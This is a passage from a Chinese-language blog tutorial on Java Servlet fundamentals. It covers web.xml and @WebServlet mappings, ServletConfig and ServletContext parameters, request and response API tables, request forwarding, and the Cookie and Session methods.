class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HttpServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HttpServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HttpServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/HttpServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/MyServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><code>&lt;servlet-name&gt;</code>用于<code>&lt;servlet-class&gt;</code>以及<code>&lt;url-pattern&gt;</code>之间的绑定，<code>&lt;servlet-class&gt;</code>是包中的类名的绝对路径，<code>&lt;url-pattern&gt;</code>是用于请求的url路径，可以使用通配符进行处理</li>
<li><code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>标签用于是否进行预先加载，以及预加载的顺序，越小越早</li>
<li><code>&lt;url-pattern&gt;</code>存在匹配的规则</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">精确匹配  	／具体的名称  	只有路径是具体的名称的时候才会触发Serv1et</span><br><span class="line">后缰匹配  	*.xxx	      	只要是以×××结尾的就匹配触发Serv1et</span><br><span class="line">通配符匹配   /*				匹配所有请求，包含服务器的所有资源</span><br><span class="line">通配符匹配	/				匹配所有请求，包含服务器的所有资源，不包括.jsp</span><br></pre></td></tr></table></figure>
<h3 id="注解">注解</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Webser</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;64646&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样就不需要在web.xml中进行定义了，适用于Servlet3.0以上</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>类型</th>
<th>标签</th>
<th>描述</th>
<th>是否必需</th>
</tr>
</thead>
<tbody>
<tr>
<td>name</td>
<td>String</td>
<td><code>&lt;servlet-name&gt;</code></td>
<td>指定 Servlet 的 name 属性。 如果没有显式指定，则取值为该 Servlet 的完全限定名，即包名+类名。</td>
<td>否</td>
</tr>
<tr>
<td>value</td>
<td>String[ ]</td>
<td><code>&lt;url-pattern&gt;</code></td>
<td>该属性等价于 urlPatterns 属性，两者不能同时指定。 如果同时指定，通常是忽略 value 的取值。</td>
<td>是</td>
</tr>
<tr>
<td>urlPatterns</td>
<td>String[ ]</td>
<td><code>&lt;url-pattern&gt;</code></td>
<td>指定一组 Servlet 的 URL 匹配模式。</td>
<td>是</td>
</tr>
<tr>
<td>loadOnStartup</td>
<td>int</td>
<td><code>&lt;load-on-startup&gt;</code></td>
<td>指定 Servlet 的加载顺序。</td>
<td>否</td>
</tr>
<tr>
<td>initParams</td>
<td>WebInitParam[ ]</td>
<td><code>&lt;init-param&gt;</code></td>
<td>指定一组 Servlet 初始化参数。</td>
<td>否</td>
</tr>
<tr>
<td>asyncSupported</td>
<td>boolean</td>
<td><code>&lt;async-supported&gt;</code></td>
<td>声明 Servlet 是否支持异步操作模式。</td>
<td>否</td>
</tr>
<tr>
<td>description</td>
<td>String</td>
<td><code>&lt;description&gt;</code></td>
<td>指定该 Servlet 的描述信息。</td>
<td>否</td>
</tr>
<tr>
<td>displayName</td>
<td>String</td>
<td><code>&lt;display-name&gt;</code></td>
<td>指定该 Servlet 的显示名。</td>
<td>否</td>
</tr>
</tbody>
</table>
<h3 id="多路由映射">多路由映射</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myServlet3<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@WebServlet(urlPatterns = &#123; &quot;/myServlet&quot;, &quot;/myServlet4&quot; &#125;)</span><br></pre></td></tr></table></figure>
<h2 id="ServletConfig">ServletConfig</h2>
<h3 id="获取初始对象">获取初始对象</h3>
<p>通过 ServletConfig 对象即可获得当前 Servlet 的初始化参数信息。</p>
<p>获得方式：</p>
<ol>
<li>
<p>使用带参的 init() 方法获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">//从带参init方法中，提取ServletConfig对象</span></span><br><span class="line">    <span class="built_in">this</span>.servletConfig = config;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>GenericServlet 提供的 getServletConfig() 方法获得</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.getServletConfig()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="ServletConfig-接口">ServletConfig 接口</h3>
<p>javax.servlet 包提供了一个 ServletConfig 接口，该接口中提供了以下方法。</p>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>String</td>
<td>getInitParameter(String name)</td>
<td>根据初始化参数名 name，返回对应的初始化参数值。</td>
</tr>
<tr>
<td>Enumeration<code>&lt;String&gt;</code></td>
<td>getInitParameterNames()</td>
<td>返回 Servlet 所有的初始化参数名的枚举集合，如果该 Servlet 没有初始化参数，则返回一个空的集合。</td>
</tr>
<tr>
<td>ServletContext</td>
<td>getServletContext()</td>
<td>返回一个代表当前 Web 应用的 ServletContext 对象。</td>
</tr>
<tr>
<td>String</td>
<td>getServletName()</td>
<td>返回 Servlet 的名字，即 web.xml 中 <servlet-name> 元素的值。</td>
</tr>
</tbody>
</table>
<ol>
<li>
<p>初始化参数xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>URL<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://gudiffany.github.io/<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要在servlet标签中使用</p>
</li>
<li>
<p>初始化参数WebServlet</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initParams = &#123;<span class="meta">@WebInitParam(name = &quot;name&quot;, value = &quot;diffany&quot;)</span>,<span class="meta">@WebInitParam(name = &quot;URL&quot;, value=&quot;https://gudiffany.github.io/&quot;)</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>获得初始化参数</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();<span class="comment">//输出流</span></span><br><span class="line"><span class="comment">// 获取ServletConfig对象</span></span><br><span class="line"><span class="type">ServletConfig</span> <span class="variable">config</span> <span class="operator">=</span> getServletConfig();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取servletName</span></span><br><span class="line"><span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> config.getServletName();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 servlet 的初始化参数的名称的集合</span></span><br><span class="line">Enumeration&lt;String&gt; initParameterNames = config.getInitParameterNames();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历集合获取初始化参数名称</span></span><br><span class="line"><span class="keyword">while</span> (initParameterNames.hasMoreElements()) &#123;</span><br><span class="line">       <span class="comment">// 获取初始化参数名称</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">initParamName</span> <span class="operator">=</span> initParameterNames.nextElement();</span><br><span class="line">       <span class="comment">// 获取相应的初始参数的值</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">initParamValue</span> <span class="operator">=</span> config.getInitParameter(initParamName);</span><br><span class="line">       <span class="comment">// 向页面输出</span></span><br><span class="line">       writer.write(initParamName + <span class="string">&quot;  :  &quot;</span> + initParamValue + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ServletContext">ServletContext</h2>
<h3 id="获得">获得</h3>
<p>ServletContext是Servlet共用的，通过这个对象实现不同路由之间的通信</p>
<p>获得 ServletContext 对象有以下 4 种方式：</p>
<ol>
<li>通过 GenericServlet 提供的 getServletContext() 方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过 GenericServlet的getServletContext方法获取ServletContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过 ServletConfig 提供的 getServletContext() 方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过 ServletConfig的 getServletContext方法获取ServletContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletConfig().getServletContext();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>通过 HttpSession 提供的 getServletContext() 方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过 HttpSession的 getServletContext方法获取ServletContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>通过 HttpServletRequest 提供的 getServletContext() 方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过 HttpServletRequest的 getServletContext方法获取ServletContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getServletContext();</span><br></pre></td></tr></table></figure>
<h3 id="应用">应用</h3>
<ol>
<li>初始化参数</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>url<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>www.biancheng.net<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>获得初始化参数</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"><span class="comment">// 调用httpServlet父类GenericServlet的getServletContext方法获取ServletContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">super</span>.getServletContext();</span><br><span class="line"><span class="comment">// 返回 context 上下文初始化参数的名称</span></span><br><span class="line">Enumeration&lt;String&gt; initParameterNames = context.getInitParameterNames();</span><br><span class="line"><span class="keyword">while</span> (initParameterNames.hasMoreElements()) &#123;</span><br><span class="line">      <span class="comment">// 获取初始化参数名称</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">initParamName</span> <span class="operator">=</span> initParameterNames.nextElement();</span><br><span class="line">      <span class="comment">// 获取相应的初始参数的值</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">initParamValue</span> <span class="operator">=</span> context.getInitParameter(initParamName);</span><br><span class="line">      <span class="comment">// 向页面输出</span></span><br><span class="line">      writer.write(initParamName + <span class="string">&quot;  :  &quot;</span> + initParamValue + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>数据通讯</li>
</ol>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>void</td>
<td>setAttribute(String name, Object object)</td>
<td>把一个 Java 对象与一个属性名绑定，并将它作为一个属性存放到 ServletContext 中。 参数 name 为属性名，参数 object 为属性值。</td>
</tr>
<tr>
<td>void</td>
<td>removeAttribute(String name)</td>
<td>从 ServletContext 中移除属性名为 name 的属性。</td>
</tr>
<tr>
<td>Object</td>
<td>getAttribute(String name)</td>
<td>根据指定的属性名 name，返回 ServletContext 中对应的属性值。</td>
</tr>
</tbody>
</table>
<p>example</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/CountServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 获取ServletContext对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">        <span class="comment">// 初始化时，向ServletContext中设置count属性，初始值为0</span></span><br><span class="line">        context.setAttribute(<span class="string">&quot;count&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 调用httpServlet父类GenericServlet的getServletContext方法获取ServletContext对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">super</span>.getServletContext();</span><br><span class="line">        <span class="comment">// 获取count的值，自增</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> (Integer) context.getAttribute(<span class="string">&quot;count&quot;</span>);</span><br><span class="line">        <span class="comment">// 存入到域对象中</span></span><br><span class="line">        context.setAttribute(<span class="string">&quot;count&quot;</span>, ++count);</span><br><span class="line">        <span class="comment">// 向页面输出内容</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;h3&gt;编程帮  www.biancheng.net 欢迎您&lt;/h3&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/ShowServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShowServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取ServletContext中存放的count属性（即页面的访问次数）</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> (Integer) getServletContext().getAttribute(<span class="string">&quot;count&quot;</span>);</span><br><span class="line">        <span class="comment">// 向页面输出</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 若CountServlet已被访问</span></span><br><span class="line">        <span class="keyword">if</span> (count != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;&lt;h3&gt;该网站一共被访问了&quot;</span> + count + <span class="string">&quot;次&lt;/h3&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 若CountServlet未被访问，提示先访问CountServlet</span></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;&lt;h3&gt;请先访问 CountServlet&lt;/h3&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="HttpServletRequest">HttpServletRequest</h2>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法声明</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>String</td>
<td>getMethod()</td>
<td>该方法用于获取 HTTP 请求方式（如 GET、POST 等）。</td>
</tr>
<tr>
<td>String</td>
<td>getRequestURI()</td>
<td>该方法用于获取请求行中的资源名称部分，即位于 URL 的主机和端口之后，参数部分之前的部分。</td>
</tr>
<tr>
<td>String</td>
<td>getQueryString()</td>
<td>该方法用于获取请求行中的参数部分，也就是 URL 中“?”以后的所有内容。</td>
</tr>
<tr>
<td>String</td>
<td>getContextPath()</td>
<td>返回当前 Servlet 所在的应用的名字（上下文）。对于默认（ROOT）上下文中的 Servlet，此方法返回空字符串&quot;&quot;。</td>
</tr>
<tr>
<td>String</td>
<td>getServletPath()</td>
<td>该方法用于获取 Servlet 所映射的路径。</td>
</tr>
<tr>
<td>String</td>
<td>getRemoteAddr()</td>
<td>该方法用于获取客户端的 IP 地址。</td>
</tr>
<tr>
<td>String</td>
<td>getRemoteHost()</td>
<td>该方法用于获取客户端的完整主机名，如果无法解析出客户机的完整主机名，则该方法将会返回客户端的 IP 地址。</td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">writer.println(<span class="string">&quot;请求方式:&quot;</span> + request.getMethod() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;客户端的 IP 地址:&quot;</span> + request.getRemoteAddr() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;应用名字（上下文）:&quot;</span> + request.getContextPath() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;URI:&quot;</span> + request.getRequestURI() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;请求字符串:&quot;</span> + request.getQueryString() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Servlet所映射的路径:&quot;</span> + request.getServletPath() + <span class="string">&quot;&lt;br/&gt;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;客户端的完整主机名:&quot;</span> + request.getRemoteHost() + <span class="string">&quot;&lt;br/&gt;&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法声明</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>String</td>
<td>getHeader(String name)</td>
<td>该方法用于获取一个指定头字段的值。 如果请求消息中包含多个指定名称的头字段，则该方法返回其中第一个头字段的值。</td>
</tr>
<tr>
<td>Enumeration</td>
<td>getHeaders(String name)</td>
<td>该方法返回指定头字段的所有值的枚举集合， 在多数情况下，一个头字段名在请求消息中只出现一次，但有时可能会出现多次。</td>
</tr>
<tr>
<td>Enumeration</td>
<td>getHeaderNames()</td>
<td>该方法返回请求头中所有头字段的枚举集合。</td>
</tr>
<tr>
<td>String</td>
<td>getContentType()</td>
<td>该方法用于获取 Content-Type 头字段的值。</td>
</tr>
<tr>
<td>int</td>
<td>getContentLength()</td>
<td>该方法用于获取 Content-Length 头字段的值 。</td>
</tr>
<tr>
<td>String</td>
<td>getCharacterEncoding()</td>
<td>该方法用于返回请求消息的字符集编码 。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法声明</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>String</td>
<td>getParameter(String name)</td>
<td>返回指定参数名的参数值。</td>
</tr>
<tr>
<td>String [ ]</td>
<td>getParameterValues (String name)</td>
<td>以字符串数组的形式返回指定参数名的所有参数值（HTTP 请求中可以有多个相同参数名的参数）。</td>
</tr>
<tr>
<td>Enumeration</td>
<td>getParameterNames()</td>
<td>以枚举集合的形式返回请求中所有参数名。</td>
</tr>
<tr>
<td>Map</td>
<td>getParameterMap()</td>
<td>用于将请求中的所有参数名和参数值装入一个 Map 对象中返回。</td>
</tr>
</tbody>
</table>
<h3 id="HttpServletResponse">HttpServletResponse</h3>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>void</td>
<td>setStatus（int status）</td>
<td>用于设置 HTTP 响应消息的状态码，并生成响应状态行。</td>
</tr>
<tr>
<td>void</td>
<td>sendError（int sc）</td>
<td>用于发送表示错误信息的状态码。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>void</td>
<td>addHeader(String name,String value)</td>
<td>用于增加响应头字段，其中，参数 name 用于指定响应头字段的名称，参数 value 用于指定响应头字段的值。</td>
</tr>
<tr>
<td>void</td>
<td>setHeader (String name,String value)</td>
<td>用于设置响应头字段，其中，参数 name 用于指定响应头字段的名称，参数 value 用于指定响应头字段的值。</td>
</tr>
<tr>
<td>void</td>
<td>addIntHeader(String name,int value)</td>
<td>用于增加值为 int 类型的响应头字段，其中，参数 name 用于指定响应头字段的名称，参数 value 用于指定响应头字段的值，类型为 int。</td>
</tr>
<tr>
<td>void</td>
<td>setIntHeader(String name, int value)</td>
<td>用于设置值为 int 类型的响应头字段，其中，参数 name 用于指定响应头字段的名称，参数 value 用于指定响应头字段的值，类型为 int。</td>
</tr>
<tr>
<td>void</td>
<td>setContentType(String type)</td>
<td>用于设置 Servlet 输出内容的 MIME 类型以及编码格式。</td>
</tr>
<tr>
<td>void</td>
<td>setCharacterEncoding(String charset)</td>
<td>用于设置输出内容使用的字符编码。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>ServletOutputStream</td>
<td>getOutputStream()</td>
<td>用于获取字节输出流对象。</td>
</tr>
<tr>
<td>PrintWriter</td>
<td>getWriter()</td>
<td>用于获取字符输出流对象。</td>
</tr>
</tbody>
</table>
<h2 id="请求转发">请求转发</h2>
<p>对于客户端的请求，可能需要多个web服务进行处理，这个时候就需要请求转发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">request.setAttribute(<span class="string">&quot;welcome&quot;</span>, <span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/Servlet&quot;</span>).forward(request, response);</span><br></pre></td></tr></table></figure>
<p>只要对request设置，然后getRequestDispatcher转发到路由上就行了</p>
<h2 id="Session与Cookie">Session与Cookie</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
<th>所属接口</th>
</tr>
</thead>
<tbody>
<tr>
<td>void addCookie(Cookie cookie)</td>
<td>用于在响应头中增加一个相应的 Set-Cookie 头字段。</td>
<td>javax.servlet.http.HttpServletResponse</td>
</tr>
<tr>
<td>Cookie[] getCookies()</td>
<td>用于获取客户端提交的 Cookie。</td>
<td>javax.servlet.http.HttpServletRequest</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>int</td>
<td>getMaxAge()</td>
<td>用于获取指定 Cookie 的最大有效时间，以秒为单位。 默认情况下取值为 -1，表示该 Cookie 保留到浏览器关闭为止。</td>
</tr>
<tr>
<td>String</td>
<td>getName()</td>
<td>用于获取 Cookie 的名称。</td>
</tr>
<tr>
<td>String</td>
<td>getPath()</td>
<td>用于获取 Cookie 的有效路径。</td>
</tr>
<tr>
<td>boolean</td>
<td>getSecure()</td>
<td>如果浏览器只通过安全协议发送 Cookie，则返回 true；如果浏览器可以使用任何协议发送 Cookie，则返回 false。</td>
</tr>
<tr>
<td>String</td>
<td>getValue()</td>
<td>用于获取 Cookie 的值。</td>
</tr>
<tr>
<td>int</td>
<td>getVersion()</td>
<td>用于获取 Cookie 遵守的协议版本。</td>
</tr>
<tr>
<td>void</td>
<td>setMaxAge(int expiry)</td>
<td>用于设置 Cookie 的最大有效时间，以秒为单位。 取值为正值时，表示 Cookie 在经过指定时间后过期。取值为负值时，表示 Cookie 不会被持久存储，在 Web 浏览器退出时删除。取值为 0 时，表示删除该 Cookie。</td>
</tr>
<tr>
<td>void</td>
<td>setPath(String uri)</td>
<td>用于指定 Cookie 的路径。</td>
</tr>
<tr>
<td>void</td>
<td>setSecure(boolean flag)</td>
<td>用于设置浏览器是否只能使用安全协议（如 HTTPS 或 SSL）发送 Cookie。</td>
</tr>
<tr>
<td>void</td>
<td>setValue(String newValue)</td>
<td>用于设置 Cookie 的值。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>返回值类型</th>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>long</td>
<td>getCreationTime()</td>
<td>返回创建 Session 的时间。</td>
</tr>
<tr>
<td>String</td>
<td>getId()</td>
<td>返回获取 Seesion 的唯一的 ID。</td>
</tr>
<tr>
<td>long</td>
<td>getLastAccessedTime()</td>
<td>返回客户端上一次发送与此 Session 关联的请求的时间。</td>
</tr>
<tr>
<td>int</td>
<td>getMaxInactiveInterval()</td>
